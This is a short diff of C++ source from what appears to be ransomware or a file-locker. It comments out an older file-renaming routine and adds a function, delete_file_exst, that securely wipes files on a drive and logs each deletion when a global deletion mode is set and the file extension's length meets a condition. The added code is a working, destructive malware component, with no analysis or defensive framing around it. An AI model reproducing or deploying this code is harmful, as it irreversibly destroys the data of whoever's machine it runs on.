@@ -159,26 +159,30 @@ char* filesystem::NameMethodState(PFILE_INFO fileinfo, PDRIVE_INFO data)
 // 	fileinfo.hblock->crypt;
 // 	DESC desc = api::OpenFile(path);
 
-// 	switch (GLOBAL_ENUM.g_CryptName)
-// 	{
-// 	case NAME::BASE64_NAME_CRYPT:
-// 	case NAME::BASE64_NAME:
-// 		CryptInfo->name_method = (OptionNameFunc)filesystem::OptionNameBase;
-// 		break;
-// 	case NAME::HASH_NAME:
-// 		CryptInfo->name_method = (OptionNameFunc)filesystem::OptionNameHash;
-// 		break;
-// 	default:
-// 		CryptInfo->name_method = (OptionNameFunc)filesystem::OptionNameStandart;
-// 		break;
-// 	}
-	
-// 	char* fullname = NameMethodState(fileinfo, data);
-// 	if(!fullname)
-// 		return;
+// 	// char* fullname = NameMethodState(fileinfo, data);
+// 	// if(!fullname)
+// 	// 	return;
 
-// 	rename(FileInfo->file_path, FileInfo->recent_filename);
-
-
+// 	//rename(FileInfo->file_path, FileInfo->recent_filename);
 // }
+
+#define min(a,b) (((a) < (b)) ? (a) : (b))
+
+void filesystem::delete_file_exst(PDRIVE_INFO data)
+{
+	size_t lex = memory::StrLen(data->Exst);
+	if(lex < ECRYPT_NAME_LEN && GLOBAL_ENUM.g_CryptName == NAME::DELETE_NAME_)
+	{
+		locker::SecureDelete(data->FullPath);
+		LOG_INFO("delete: %s", data->FullPath);
+	}
+	else if(lex == ECRYPT_NAME_LEN &&  GLOBAL_ENUM.g_CryptName == NAME::DELETE_NAME_L)
+	{
+		locker::SecureDelete(data->FullPath);
+		LOG_INFO("delete: %s", data->FullPath);
+	}
+		
+	PathSystem::free_driveinfo_st(data);
+}
+
 
